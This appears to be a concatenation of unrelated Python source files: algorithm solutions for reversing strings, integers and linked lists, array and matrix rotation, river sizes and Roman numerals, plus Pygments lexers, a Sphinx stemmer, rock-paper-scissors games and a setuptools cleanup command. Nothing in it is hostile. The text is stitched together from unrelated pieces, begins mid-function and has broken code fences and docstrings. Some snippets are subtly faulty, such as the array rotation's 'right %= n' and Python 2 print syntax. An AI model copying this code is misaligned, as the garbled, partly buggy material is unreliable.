        # last encountered opening bracket till
        # the current character
        elif inputString[i] == ")":
            substring_with_parentheses = inputString[
                opening_brackets_indices[-1] : i + 1
            ]
            inputString = (
                inputString[: opening_brackets_indices[-1]]
                + substring_with_parentheses[::-1]
                + inputString[i + 1 :]
            )
            print(inputString)
            del opening_brackets_indices[-1]
    # Store new string with reversed parentheses
    # removed
    new_string_without_parentheses = ""
    for i in range(len(inputString)):
        if inputString[i] != "(" and inputString[i] != ")":
            new_string_without_parentheses += inputString[i]
    return new_string_without_parentheses
```

````py
Reverse Integer

Given signed integer, reverse digits of an integer.

Input: 123
Output: 321

Input: -123
Output: -321

Input: 120
Output: 21

=========================================
Simple solution, mod 10 to find all digits.
    Time Complexity:    O(N)    , N = number of digits
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def reverse_integer(x):
    if x == 0:
        return 0

    sign = x // abs(x)  # find the sign, -1 or 1
    x *= sign  # make positive x, or x = abs(x)

    res = 0
    while x > 0:
        res = (res * 10) + (x % 10)
        x //= 10

    return res * sign


###########
# Testing #
###########

# Test 1
# Correct result => 321
print(reverse_integer(123))

# Test 2
# Correct result => -321
print(reverse_integer(-123))

# Test 3
# Correct result => 21
print(reverse_integer(120))

def reverse_letters(input_str: str) -> str:
    """
    Reverses letters in a given string without adjusting the position of the words
    >>> reverse_letters('The cat in the hat')
    'ehT tac ni eht tah'
    >>> reverse_letters('The quick brown fox jumped over the lazy dog.')
    'ehT kciuq nworb xof depmuj revo eht yzal .god'
    >>> reverse_letters('Is this true?')
    'sI siht ?eurt'
    >>> reverse_letters("I   love       Python")
    'I evol nohtyP'
    """
    return " ".join([word[::-1] for word in input_str.split()])


if __name__ == "__main__":
    import doctest

    doctest.testmod()
````

````py
Reverse a linked list

Reverse a linked list in one iteration without using additional space.

Input: 1 -> 2 -> 3 -> 4
Output: 4 -> 3 -> 2 -> 1

=========================================
Iterate LL and change the pointer of the current nodes to point to the previous nodes.
    Time Complexity:    O(N)
    Space Complexity:   O(1)
Solution 2: Same approach using recursion.
    Time Complexity:    O(N)
    Space Complexity:   O(N)        , because of the recursion stack (the stack will be with N depth till the last node of the linked list is reached)```


```py


##############
# Solution 1 #
##############

# import ListNode class from ll_helpers.py
from ll_helpers import ListNode


def reverse_ll(ll):
    prev_node = None

    while ll is not None:
        # save the current node
        current = ll
        # go to the next node
        ll = ll.next

        # change the pointer of the current node to point to the previous node
        current.next = prev_node
        # save the current node for the next iteration
        prev_node = current

    return prev_node


##############
# Solution 2 #
##############


def reverse_ll_2(ll):
    return reverse(ll, None)


def reverse(node, prev_node):
    if node is None:
        # the end of the ll is reached, return the previous node
        # that'll be the first node in the reversed ll
        return prev_node

    # send node.next as current node and node as previous node in the next step
    result = reverse(node.next, node)
    # change the pointer of the current node to point to the previous node
    node.next = prev_node

    return result


###########
# Testing #
###########

# import build_ll and print_ll methods from ll_helpers.py
from ll_helpers import build_ll, print_ll

# Test 1
# Correct result => 4 -> 3 -> 2 -> 1
print_ll(reverse_ll(build_ll([1, 2, 3, 4])))
print_ll(reverse_ll_2(build_ll([1, 2, 3, 4])))
````

````py
This sort is designed by me.
First self designed sorting Algorithm.
Kalpak Take```


```py

def reverse_sort(array):
 for i in range(len(array) - 1):
  for n in range(len(array) - 1):
   a = array[n]
   if (a < array[i]):
    tem = array[i]
    array[i] = a
    array[n] = tem
 return array

print reverse_sort([123, 3455, 6577, 546, 345, 22, 56, 7])
````

````py
Reverse string

Reverse string, in linear time complexity.

Input: 'i like this program very much'
Output: 'hcum yrev margorp siht ekil i'

Input: 'how are you'
Output: 'uoy era woh'

=========================================
Reverse the whole sentence by swapping pair letters in-place (first with last, second with second from the end, etc).
In Python, the string manipulation operations are too slow (string is immutable), because of that we need to convert the string into array.
In C/C++, the Space complexity will be O(1) (because the strings are just arrays with chars).
Exist 2 more "Pythonic" ways of reversing strings/arrays:
- reversed_str = reversed(str)
- reversed_str = str[::-1]
But I wanted to show how to implement a reverse algorithm step by step so someone will know how to implement it in other languages.
    Time Complexity:    O(N)
    Space Complexity:   O(N)```


```py


############
# Solution #
############


def reverse_sentence(sentence):
    arr = [c for c in sentence]  # or just arr = list(sentence)
    start = 0
    end = len(arr) - 1

    while start < end:
        # reverse the array from the start index to the end index by
        # swaping each char with the pair from the other part of the array
        swap(arr, start, end)
        start += 1
        end -= 1

    return "".join(arr)


def swap(arr, i, j):
    # swapping two elements from a same array
    arr[i], arr[j] = arr[j], arr[i]
    """same as
    temp = arr[i]
    arr[i] = arr[j]
    arr[j] = temp
    """


###########
# Testing #
###########

# Test 1
# Correct result => 'hcum yrev margorp siht ekil i'
print(reverse_sentence("i like this program very much"))

# Test 2
# Correct result => 'uoy era woh'
print(reverse_sentence("how are you"))
````

````py
Reverse Vowels

Given a text string, create and return a new string constructed by finding all its vowels (for
simplicity, in this problem vowels are the letters in the string 'aeiouAEIOU') and reversing their
order, while keeping all non-vowel characters exactly as they were in their original positions.

Input: 'Hello world'
Output: 'Hollo werld'

=========================================
Simple solution, find a vowel from left and swap it with a vowel from right.
In Python, the string manipulation operations are too slow (string is immutable), because of that we need to convert the string into array.
In C/C++, the Space complexity will be O(1) (because the strings are just arrays with chars).
    Time Complexity:    O(N)
    Space Complexity:   O(N)```


```py


############
# Solution #
############


def reverse_vowels(sentence):
    arr = [c for c in sentence]  # or just arr = list(sentence)

    vowels = {
        "a": True,
        "A": True,
        "e": True,
        "E": True,
        "i": True,
        "I": True,
        "o": True,
        "O": True,
        "u": True,
        "U": True,
    }

    left = 0
    right = len(arr) - 1

    while True:
        # find a vowel from left
        while left < right:
            if arr[left] in vowels:
                break
            left += 1

        # find a vowel from right
        while left < right:
            if arr[right] in vowels:
                break
            right -= 1

        if left >= right:
            # in this case, there are only 1 or 0 vowels
            # so this is the end of the algorithm, no need from more reversing
            break

        # swap the vowels
        arr[left], arr[right] = arr[right], arr[left]

        left += 1
        right -= 1

    return "".join(arr)


###########
# Testing #
###########

# Test 1
# Correct result => 'ubcdofghijklmnepqrstavwxyz'
print(reverse_vowels("abcdefghijklmnopqrstuvwxyz"))

# Test 2
# Correct result => 'Hollo werld'
print(reverse_vowels("Hello world"))

def reverse_words(input_str: str) -> str:
    """
    Reverses words in a given string
    >>> reverse_words("I love Python")
    'Python love I'
    >>> reverse_words("I     Love          Python")
    'Python Love I'
    """
    return " ".join(input_str.split()[::-1])


if __name__ == "__main__":
    import doctest

    doctest.testmod()
````

````py
Reverse words in sentence

Reverse words in a given string, in linear time complexity.

Input: 'i like this program very much'
Output: 'much very program this like i'

Input: 'how are you'
Output: 'you are how'

=========================================
First, find each word and reverse it (in place, by swapping the letters),
after all words are reversed, reverse the whole sentence (in place, by swapping the letters)
and the first word will be last and will be in the original form.
In Python, the string manipulation operations are too slow (string is immutable), because of that we need to convert the string into array.
In C/C++, the Space complexity will be O(1) (because the strings are just arrays with chars).
    Time Complexity:    O(N)
    Space Complexity:   O(N)```


```py


############
# Solution #
############


def reverse_words_in_sentence(sentence):
    arr = [c for c in sentence]  # or just arr = list(sentence)
    n = len(arr)
    last_idx = n - 1
    start = 0

    # reverse all words
    for i in range(n):
        if arr[i] == " ":
            # in this moment we're sure that the word is complete
            reverse_array(arr, start, i - 1)
            start = i + 1
    # reverse the last word
    reverse_array(arr, start, last_idx)
    # reverse the whole sentence
    reverse_array(arr, 0, last_idx)

    return "".join(arr)


def reverse_array(arr, start, end):
    # reverse the array from the start index to the end index
    while start < end:
        arr[start], arr[end] = arr[end], arr[start]  # swap
        start += 1
        end -= 1


###########
# Testing #
###########

# Test 1
# Correct result => 'much very program this like i'
print(reverse_words_in_sentence("i like this program very much"))

# Test 2
# Correct result => 'you are how'
print(reverse_words_in_sentence("how are you"))

import warnings
warnings.warn("qtconsole.rich_ipython_widget is deprecated; "
              "use qtconsole.rich_jupyter_widget", DeprecationWarning)
from .rich_jupyter_widget import *

class RingBuffer:
    def __init__(self, capacity):
        pass

    def append(self, item):
        pass

    def get(self):
        pass```


```py
River Sizes

You are given a two-dimensional array (matrix) of potentially unequal height and width containing only 0s and 1s.
Each 0 represents land, and each 1 represents part of a river. A river consists of any number of 1s that are
either horizontally or vertically adjacent (but not diagonally adjacent).
The number of adjacent 1s forming a river determine its size.
Write a function that returns an array of the sizes of all rivers represented in the input matrix.
Note that these sizes do not need to be in any particular order.

Input:
[
[1, 0, 0, 1],
[1, 0, 1, 0],
[0, 0, 1, 0],
[1, 0, 1, 0]
]
Output: [2, 1, 3, 1]

=========================================
This problem can be solved using DFS or BFS.
If 1 is found, find all horizontal or vertical neighbours (1s), and mark them as 0.
    Time Complexity:    O(N*M)
    Space Complexity:   O(N*M)     , because of recursion calls stack```


```py


############
# Solution #
############


def river_sizes(matrix):
    n = len(matrix)
    m = len(matrix[0])

    results = []

    for i in range(n):
        for j in range(m):
            if matrix[i][j] != 0:
                # find the river size
                size = dfs((i, j), matrix)

                # save the river size
                results.append(size)

    return results


def dfs(coord, matrix):
    (i, j) = coord

    if i < 0 or j < 0:
        # invalid position
        return 0

    n = len(matrix)
    m = len(matrix[0])

    if i == n or j == m:
        # invalid position
        return 0

    if matrix[i][j] == 0:
        # not a river
        return 0

    # update the matrix, the matrix is passed by reference
    matrix[i][j] = 0
    # this position is part of river
    size = 1

    # directions: down, left, up, right
    dirs = [(-1, 0), (0, -1), (1, 0), (0, 1)]

    # check all 4 directions
    for d in dirs:
        size += dfs((i + d[0], j + d[1]), matrix)

    return size


###########
# Testing #
###########

# Test 1
# Correct result => [2, 1, 3, 1]
matrix = [[1, 0, 0, 1], [1, 0, 1, 0], [0, 0, 1, 0], [1, 0, 1, 0]]
print(river_sizes(matrix))
````

````py
    pygments.lexers.rnc
    ~~~~~~~~~~~~~~~~~~~

    Lexer for Relax-NG Compact syntax

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.lexer import RegexLexer
from pygments.token import Text, Comment, Operator, Keyword, Name, String, \
    Punctuation

__all__ = ['RNCCompactLexer']


class RNCCompactLexer(RegexLexer):
    """
    For `RelaxNG-compact <http://relaxng.org>`_ syntax.

    .. versionadded:: 2.2
    """

    name = 'Relax-NG Compact'
    aliases = ['rng-compact', 'rnc']
    filenames = ['*.rnc']

    tokens = {
        'root': [
            (r'namespace\b', Keyword.Namespace),
            (r'(?:default|datatypes)\b', Keyword.Declaration),
            (r'##.*$', Comment.Preproc),
            (r'#.*$', Comment.Single),
            (r'"[^"]*"', String.Double),
            # TODO single quoted strings and escape sequences outside of
            # double-quoted strings
            (r'(?:element|attribute|mixed)\b', Keyword.Declaration, 'variable'),
            (r'(text\b|xsd:[^ ]+)', Keyword.Type, 'maybe_xsdattributes'),
            (r'[,?&*=|~]|>>', Operator),
            (r'[(){}]', Punctuation),
            (r'.', Text),
        ],

        # a variable has been declared using `element` or `attribute`
        'variable': [
            (r'[^{]+', Name.Variable),
            (r'\{', Punctuation, '#pop'),
        ],

        # after an xsd:<datatype> declaration there may be attributes
        'maybe_xsdattributes': [
            (r'\{', Punctuation, 'xsdattributes'),
            (r'\}', Punctuation, '#pop'),
            (r'.', Text),
        ],

        # attributes take the form { key1 = value1 key2 = value2 ... }
        'xsdattributes': [
            (r'[^ =}]', Name.Attribute),
            (r'=', Operator),
            (r'"[^"]*"', String.Double),
            (r'\}', Punctuation, '#pop'),
            (r'.', Text),
        ],
    }
````

````py
    sphinx.search.ro
    ~~~~~~~~~~~~~~~~

    Romanian search language: includes the JS Romanian stemmer.

    :copyright: Copyright 2007-2021 by the Sphinx team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from typing import Dict, Set

import snowballstemmer

from sphinx.search import SearchLanguage


class SearchRomanian(SearchLanguage):
    lang = 'ro'
    language_name = 'Romanian'
    js_stemmer_rawcode = 'romanian-stemmer.js'
    stopwords: Set[str] = set()

    def init(self, options: Dict) -> None:
        self.stemmer = snowballstemmer.stemmer('romanian')

    def stem(self, word: str) -> str:
        return self.stemmer.stemWord(word.lower())

import heapq


def deleteMinimalPeaks(numbers):
    if len(numbers) <= 1:
        return numbers
    q = []
    neighbors = {}
    for i in range(len(numbers)):
        if i == 0:
            if numbers[i] > numbers[i + 1]:
                heapq.heappush(q, (numbers[i], -1, numbers[i + 1]))
            neighbors[numbers[i]] = [-1, numbers[i + 1]]
        elif i == len(numbers) - 1:
            if numbers[i] > numbers[i - 1]:
                heapq.heappush(q, (numbers[i], numbers[i - 1], -1))
            neighbors[numbers[i]] = [numbers[i - 1], -1]
        else:
            if numbers[i - 1] < numbers[i] > numbers[i + 1]:
                heapq.heappush(q, (numbers[i], numbers[i - 1], numbers[i + 1]))
            neighbors[numbers[i]] = [numbers[i - 1], numbers[i + 1]]

    result = []
    while q:
        curr, left, right = heapq.heappop(q)
        result.append(curr)
        if left != -1:
            neighbors[left][1] = right
            if neighbors[left][0] < left > right:
                heapq.heappush(q, (left, neighbors[left][0], neighbors[left][1]))
        if right != -1:
            neighbors[right][0] = left
            if neighbors[right][0] < right > neighbors[right][1]:
                heapq.heappush(q, (right, neighbors[right][0], neighbors[right][1]))
    return result


if __name__ == "__main__":
    # numbers = [2, 7, 8, 5, 1, 6, 3, 9, 4]
    numbers = [1, 2]
    result = deleteMinimalPeaks(numbers)
    print(result)
````

````py
    pygments.lexers.roboconf
    ~~~~~~~~~~~~~~~~~~~~~~~~

    Lexers for Roboconf DSL.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.lexer import RegexLexer, words, re
from pygments.token import Text, Operator, Keyword, Name, Comment

__all__ = ['RoboconfGraphLexer', 'RoboconfInstancesLexer']


class RoboconfGraphLexer(RegexLexer):
    """
    Lexer for `Roboconf <http://roboconf.net/en/roboconf.html>`_ graph files.

    .. versionadded:: 2.1
    """
    name = 'Roboconf Graph'
    aliases = ['roboconf-graph']
    filenames = ['*.graph']

    flags = re.IGNORECASE | re.MULTILINE
    tokens = {
        'root': [
            # Skip white spaces
            (r'\s+', Text),

            # There is one operator
            (r'=', Operator),

            # Keywords
            (words(('facet', 'import'), suffix=r'\s*\b', prefix=r'\b'), Keyword),
            (words((
                'installer', 'extends', 'exports', 'imports', 'facets',
                'children'), suffix=r'\s*:?', prefix=r'\b'), Name),

            # Comments
            (r'#.*\n', Comment),

            # Default
            (r'[^#]', Text),
            (r'.*\n', Text)
        ]
    }


class RoboconfInstancesLexer(RegexLexer):
    """
    Lexer for `Roboconf <http://roboconf.net/en/roboconf.html>`_ instances files.

    .. versionadded:: 2.1
    """
    name = 'Roboconf Instances'
    aliases = ['roboconf-instances']
    filenames = ['*.instances']

    flags = re.IGNORECASE | re.MULTILINE
    tokens = {
        'root': [

            # Skip white spaces
            (r'\s+', Text),

            # Keywords
            (words(('instance of', 'import'), suffix=r'\s*\b', prefix=r'\b'), Keyword),
            (words(('name', 'count'), suffix=r's*:?', prefix=r'\b'), Name),
            (r'\s*[\w.-]+\s*:', Name),

            # Comments
            (r'#.*\n', Comment),

            # Default
            (r'[^#]', Text),
            (r'.*\n', Text)
        ]
    }

import random

while 2 == 2:
    print("--------------------------------------------------------------")
    get_again = raw_input("Enter rock paper or scissor :  ")
    make_use = random.choice(["rock", "paper", "scissor"])
    print("--------------------------------------------------------------")
    print(make_use)
    print("--------------------------------------------------------------")
    if get_again == "rock" and make_use == "paper":
        print('computer wins! You "LOSE" ')
        print("--------------------------------------------------------------")
        continue
    elif get_again == "rock" and make_use == "scissor":
        print("computer loses You win!")
        print("--------------------------------------------------------------")
        break
    elif get_again == "rock" and make_use == "rock":
        print("It's a tie ! try again !")
        print("--------------------------------------------------------------")
        continue
    elif get_again == "paper" and make_use == "paper":
        print("It's a tie ! try again !")
        print("--------------------------------------------------------------")
        continue
    elif get_again == "scissor" and make_use == "scissor":
        print("It's a tie ! try again !")
        print("--------------------------------------------------------------")
        continue
    elif get_again == "paper" and make_use == "scissor":
        print('computer wins! You "LOSE" ')
        print("--------------------------------------------------------------")
        continue
    elif get_again == "scissor" and make_use == "paper":
        print("computer loses You win!")
        print("--------------------------------------------------------------")
        break
    elif get_again == "paper" and make_use == "rock":
        print('computer wins! You "LOSE" ')
        print("--------------------------------------------------------------")
        continue
    elif get_again == "scissor" and make_use == "rock":
        print('computer wins You "LOSE" ')
        print("--------------------------------------------------------------")
        continue
    else:
        print("Invalid input: Try again")
        continue

# source: https://raw.githubusercontent.com/prof-rossetti/rock-paper-scissors-py/master/app/game.py

import random

GUI_WINDOW_TITLE = "Rock-Paper-Scissors"
WELCOME_MESSAGE = "Hi. Welcome to my Rock-Paper-Scissors game!"
GUI_PROMPT_MESSAGE = "Please choose an option from the dropdown:"

WIN_MESSAGE = "Congratulations, you won!"
LOSE_MESSAGE = "Oh, the computer won. It's ok."
TIE_MESSAGE = "Oh, it's a tie."


def random_choice(options=["rock", "paper", "scissors"]):
    return random.choice(options)


def determine_winner(choice1, choice2):
    """
    Determines the winning choice between two choices from selectable options: "rock", "paper", or "scissors".
    Returns the winning choice (e.g. "paper"), or None if there is a tie.
    Example: determine_winner("rock", "paper")
    """

    winners = {
        "rock": {
            "rock": None,  # represents a tie
            "paper": "paper",
            "scissors": "rock",
        },
        "paper": {
            "rock": "paper",
            "paper": None,  # represents a tie
            "scissors": "scissors",
        },
        "scissors": {
            "rock": "rock",
            "paper": "scissors",
            "scissors": None,  # represents a tie
        },
    }

    # todo: handle keyerror
    winner = winners[choice1][choice2]

    return winner


if __name__ == "__main__":

    print("-------------------")
    print("Launching the game...")
    print("-------------------")

    options = ["rock", "paper", "scissors"]

    user_choice = input("Please choose either 'rock', 'paper', or 'scissors': ")

    if user_choice in options:
        print("You chose:", user_choice)
    else:
        print(
            "Expecting one of: 'rock', 'paper', or 'scissors' (lower case, without the quotation marks). Please try again."
        )
        exit()

    computer_choice = random_choice(options)
    print("The computer chose:", computer_choice)
    print("-------------------")

    winning_choice = determine_winner(user_choice, computer_choice)

    if winning_choice:
        if winning_choice == user_choice:
            print(WIN_MESSAGE)
        elif winning_choice == computer_choice:
            print(LOSE_MESSAGE)
    else:
        print(TIE_MESSAGE)

    print("Thanks for playing. Please play again!")

#import module we need
import random

#file i/o functions for historical results
def load_results():
    text_file = open("history.txt", "r")
    history = text_file.read().split(",")
    text_file.close()
    return history

def save_results( w, t, l):
    text_file = open("history.txt", "w")
    text_file.write( str(w) + "," + str(t) + "," + str(l))
    text_file.close()

#welcome message
results = load_results()
wins = int(results[0])
ties = int( results[1])
losses = int(results[2])
print("Welcome to Rock, Paper, Scissors!")
print("Wins: %s, Ties: %s, Losses: %s" % (wins, ties, losses))
print("Please choose to continue...")


#initialize user, computer choices
computer = random.randint(1,3)
user = int(input("[1] Rock  [2] Paper   [3] Scissors    [9] Quit\n"))

#gamplay loop
while not user == 9:
    #user chooses ROCK
    if user == 1:
        if computer == 1:
            print("Computer chose rock...tie!")
            ties += 1
        elif computer == 2:
            print("Computer chose paper...computer wins :(")
            losses += 1
        else:
            print("Computer chose scissors...you wins :)")
            wins += 1

    #user chooses PAPER
    elif user == 2:
        if computer == 1:
            print("Computer chose rock...you win :)")
            wins += 1
        elif computer == 2:
            print("Computer chose paper...tie!")
            ties += 1
        else:
            print("Computer chose scissors...computer wins :(")
            losses += 1

    #user chooses SCISSORS
    elif user == 3:
        if computer == 1:
            print("Computer chose rock...computer wins :(")
            losses += 1
        elif computer == 2:
            print("Computer chose paper...you win :)")
            wins += 1
        else:
            print("Computer chose scissors...tie!")
            ties += 1
    else:
        print("Invalid selection. Please try again.")
    #print updated stats
    print("Wins: %s, Ties: %s, Losses: %s" % (wins, ties, losses))

    #prompt user to make another selection
    print("Please choose to continue...")
    #initialize user, computer choices
    computer = random.randint(1,3)
    user = int(input("[1] Rock  [2] Paper   [3] Scissors    [9] Quit\n"))

# #game over, save results
save_results(wins, ties, losses)```


```pyConvert to and from Roman numerals"""

__author__ = "Mark Pilgrim (f8dy@diveintopython.org)"
__version__ = "1.4"
__date__ = "8 August 2001"
__copyright__ = """Copyright (c) 2001 Mark Pilgrim

This program is part of "Dive Into Python", a free Python tutorial for
experienced programmers.  Visit http://diveintopython.org/ for the
latest version.

This program is free software; you can redistribute it and/or modify
it under the terms of the Python 2.1.1 license, available at
http://www.python.org/2.1.1/license.html```


```py

import re

#Define exceptions
class RomanError(Exception): pass
class OutOfRangeError(RomanError): pass
class NotIntegerError(RomanError): pass
class InvalidRomanNumeralError(RomanError): pass

#Define digit mapping
romanNumeralMap = (('M',  1000),
                   ('CM', 900),
                   ('D',  500),
                   ('CD', 400),
                   ('C',  100),
                   ('XC', 90),
                   ('L',  50),
                   ('XL', 40),
                   ('X',  10),
                   ('IX', 9),
                   ('V',  5),
                   ('IV', 4),
                   ('I',  1))

def toRoman(n):
    """convert integer to Roman numeral"""
    if not (0 < n < 5000):
        raise OutOfRangeError("number out of range (must be 1..4999)")
    if int(n) != n:
        raise NotIntegerError("decimals can not be converted")

    result = ""
    for numeral, integer in romanNumeralMap:
        while n >= integer:
            result += numeral
            n -= integer
    return result

#Define pattern to detect valid Roman numerals
romanNumeralPattern = re.compile("""
    ^                   # beginning of string
    M{0,4}              # thousands - 0 to 4 M's
    (CM|CD|D?C{0,3})    # hundreds - 900 (CM), 400 (CD), 0-300 (0 to 3 C's),
                        #            or 500-800 (D, followed by 0 to 3 C's)
    (XC|XL|L?X{0,3})    # tens - 90 (XC), 40 (XL), 0-30 (0 to 3 X's),
                        #        or 50-80 (L, followed by 0 to 3 X's)
    (IX|IV|V?I{0,3})    # ones - 9 (IX), 4 (IV), 0-3 (0 to 3 I's),
                        #        or 5-8 (V, followed by 0 to 3 I's)
    $                   # end of string
    """, re.VERBOSE)

def fromRoman(s):
    """convert Roman numeral to integer"""
    if not s:
        raise InvalidRomanNumeralError('Input can not be blank')

    if not romanNumeralPattern.search(s):
        raise InvalidRomanNumeralError('Invalid Roman numeral: %s' % s)

    result = 0
    index = 0
    for numeral, integer in romanNumeralMap:
        while s[index:index+len(numeral)] == numeral:
            result += integer
            index += len(numeral)
    return result


def roman_to_int(roman: str) -> int:
    """
    LeetCode No. 13 Roman to Integer
    Given a roman numeral, convert it to an integer.
    Input is guaranteed to be within the range from 1 to 3999.
    https://en.wikipedia.org/wiki/Roman_numerals
    >>> tests = {"III": 3, "CLIV": 154, "MIX": 1009, "MMD": 2500, "MMMCMXCIX": 3999}
    >>> all(roman_to_int(key) == value for key, value in tests.items())
    True
    """
    vals = {"I": 1, "V": 5, "X": 10, "L": 50, "C": 100, "D": 500, "M": 1000}
    total = 0
    place = 0
    while place < len(roman):
        if (place + 1 < len(roman)) and (vals[roman[place]] < vals[roman[place + 1]]):
            total += vals[roman[place + 1]] - vals[roman[place]]
            place += 2
        else:
            total += vals[roman[place]]
            place += 1
    return total


def int_to_roman(number: int) -> str:
    """
    Given a integer, convert it to an roman numeral.
    https://en.wikipedia.org/wiki/Roman_numerals
    >>> tests = {"III": 3, "CLIV": 154, "MIX": 1009, "MMD": 2500, "MMMCMXCIX": 3999}
    >>> all(int_to_roman(value) == key for key, value in tests.items())
    True
    """
    ROMAN = [
        (1000, "M"),
        (900, "CM"),
        (500, "D"),
        (400, "CD"),
        (100, "C"),
        (90, "XC"),
        (50, "L"),
        (40, "XL"),
        (10, "X"),
        (9, "IX"),
        (5, "V"),
        (4, "IV"),
        (1, "I"),
    ]
    result = []
    for (arabic, roman) in ROMAN:
        (factor, number) = divmod(number, arabic)
        result.append(roman * factor)
        if number == 0:
            break
    return "".join(result)


if __name__ == "__main__":
    import doctest

    doctest.testmod()

# Implement a class to hold room information. This should have name and
# description attributes.

class Room:
    def __init__(self, name, description):
        self.name = name
        self.description = description
        self.is_light = False

        self.contents = []
from __future__ import print_function
def dencrypt(s, n):
    out = ''
    for c in s:
        if c >= 'A' and c <= 'Z':
            out += chr(ord('A') + (ord(c) - ord('A') + n) % 26)
        elif c >= 'a' and c <= 'z':
            out += chr(ord('a') + (ord(c) - ord('a') + n) % 26)
        else:
            out += c
    return out


def main():
    s0 = 'HELLO'

    s1 = dencrypt(s0, 13)
    print(s1)  # URYYB

    s2 = dencrypt(s1, 13)
    print(s2)  # HELLO


if __name__ == '__main__':
    main()

from distutils.util import convert_path
from distutils import log
from distutils.errors import DistutilsOptionError
import os
import shutil

from setuptools import Command


class rotate(Command):
    """Delete older distributions"""

    description = "delete older distributions, keeping N newest files"
    user_options = [
        ("match=", "m", "patterns to match (required)"),
        ("dist-dir=", "d", "directory where the distributions are"),
        ("keep=", "k", "number of matching distributions to keep"),
    ]

    boolean_options = []

    def initialize_options(self):
        self.match = None
        self.dist_dir = None
        self.keep = None

    def finalize_options(self):
        if self.match is None:
            raise DistutilsOptionError(
                "Must specify one or more (comma-separated) match patterns "
                "(e.g. '.zip' or '.egg')"
            )
        if self.keep is None:
            raise DistutilsOptionError("Must specify number of files to keep")
        try:
            self.keep = int(self.keep)
        except ValueError as e:
            raise DistutilsOptionError("--keep must be an integer") from e
        if isinstance(self.match, str):
            self.match = [convert_path(p.strip()) for p in self.match.split(",")]
        self.set_undefined_options("bdist", ("dist_dir", "dist_dir"))

    def run(self):
        self.run_command("egg_info")
        from glob import glob

        for pattern in self.match:
            pattern = self.distribution.get_name() + "*" + pattern
            files = glob(os.path.join(self.dist_dir, pattern))
            files = [(os.path.getmtime(f), f) for f in files]
            files.sort()
            files.reverse()

            log.info("%d file(s) matching %s", len(files), pattern)
            files = files[self.keep :]
            for (t, f) in files:
                log.info("Deleting %s", f)
                if not self.dry_run:
                    if os.path.isdir(f):
                        shutil.rmtree(f)
                    else:
                        os.unlink(f)
````

````py
Array rotation/shifting

Rotate array in right (or left) for K places.

Input: [1, 2, 3, 4, 5, 6], 1
Output: [6, 1, 2, 3, 4, 5]

Input: [1, 2, 3, 4, 5, 6], 3
Output: [4, 5, 6, 1, 2, 3]

=========================================
The first solution is a simple one, split the array in two parts and swap those parts.
    Time Complexity:    O(N)
    Space Complexity:   O(N)
For the second one we need to compute GCD, to decide how many different sets are there.
And after that shift all elements in that set for one position in right/left.
(elements in a set are not neighboring elements)
(A Juggling Algorithm, https://www.geeksforgeeks.org/array-rotation/)
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


##############
# Solution 1 #
##############


def rotate_array_1(arr, k, right=True):
    n = len(arr)
    right %= n

    # going right for K places is same like going left for N-K places
    if right:
        k = n - k

    # the shortest way to swap 2 parts of the array
    return arr[k:] + arr[:k]


##############
# Solution 2 #
##############


def rotate_array_2(arr, k, right=True):
    n = len(arr)
    right %= n

    # going right for K places is same like going left for N-K places
    if not right:
        k = n - k

    # different sets
    sets = gcd(n, k)
    # elements in each set
    elements = n // sets
    i = 0

    while i < sets:
        j = 1
        curr = arr[i]

        while j <= elements:
            idx = (i + j * k) % n
            j += 1

            # add the previous element on this position
            curr, arr[idx] = arr[idx], curr
            """same as
            temp = curr
            curr = arr[idx]
            arr[idx] = temp
            """

        i += 1

    return arr


# greatest common divisor
def gcd(a, b):
    if b == 0:
        return a
    return gcd(b, a % b)


###########
# Testing #
###########

# Test 1
# Correct result => [4, 5, 6, 7, 8, 9, 10, 1, 2, 3]
arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
k = 7
print(rotate_array_1(arr, k))
print(rotate_array_2(arr, k))

# Test 2
# Correct result => [6, 1, 2, 3, 4, 5]
arr = [1, 2, 3, 4, 5, 6]
k = 1
print(rotate_array_1(arr, k))
print(rotate_array_2(arr, k))

# Test 3
# Correct result => [4, 5, 6, 1, 2, 3]
arr = [1, 2, 3, 4, 5, 6]
k = 3
print(rotate_array_1(arr, k))
print(rotate_array_2(arr, k))

def rotateImage(a):
    N = len(a)
    for i in range(N // 2):
        for j in range(i, N - 1 - i):
            temp = a[i][j]
            a[i][j] = a[N - 1 - j][i]
            a[N - 1 - j][i] = a[N - 1 - i][N - 1 - j]
            a[N - 1 - i][N - 1 - j] = a[j][N - 1 - i]
            a[j][N - 1 - i] = temp
    return a
````

````py
In this problem, we want to rotate the matrix elements by 90, 180, 270
(counterclockwise)
Discussion in stackoverflow:
https://stackoverflow.com/questions/42519/how-do-you-rotate-a-two-dimensional-array```


```py

from __future__ import annotations


def make_matrix(row_size: int = 4) -> list[list]:
    """
    >>> make_matrix()
    [[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 12], [13, 14, 15, 16]]
    >>> make_matrix(1)
    [[1]]
    >>> make_matrix(-2)
    [[1, 2], [3, 4]]
    >>> make_matrix(3)
    [[1, 2, 3], [4, 5, 6], [7, 8, 9]]
    >>> make_matrix() == make_matrix(4)
    True
    """
    row_size = abs(row_size) or 4
    return [[1 + x + y * row_size for x in range(row_size)] for y in range(row_size)]


def rotate_90(matrix: list[list]) -> list[list]:
    """
    >>> rotate_90(make_matrix())
    [[4, 8, 12, 16], [3, 7, 11, 15], [2, 6, 10, 14], [1, 5, 9, 13]]
    >>> rotate_90(make_matrix()) == transpose(reverse_column(make_matrix()))
    True
    """

    return reverse_row(transpose(matrix))
    # OR.. transpose(reverse_column(matrix))


def rotate_180(matrix: list[list]) -> list[list]:
    """
    >>> rotate_180(make_matrix())
    [[16, 15, 14, 13], [12, 11, 10, 9], [8, 7, 6, 5], [4, 3, 2, 1]]
    >>> rotate_180(make_matrix()) == reverse_column(reverse_row(make_matrix()))
    True
    """

    return reverse_row(reverse_column(matrix))
    # OR.. reverse_column(reverse_row(matrix))


def rotate_270(matrix: list[list]) -> list[list]:
    """
    >>> rotate_270(make_matrix())
    [[13, 9, 5, 1], [14, 10, 6, 2], [15, 11, 7, 3], [16, 12, 8, 4]]
    >>> rotate_270(make_matrix()) == transpose(reverse_row(make_matrix()))
    True
    """

    return reverse_column(transpose(matrix))
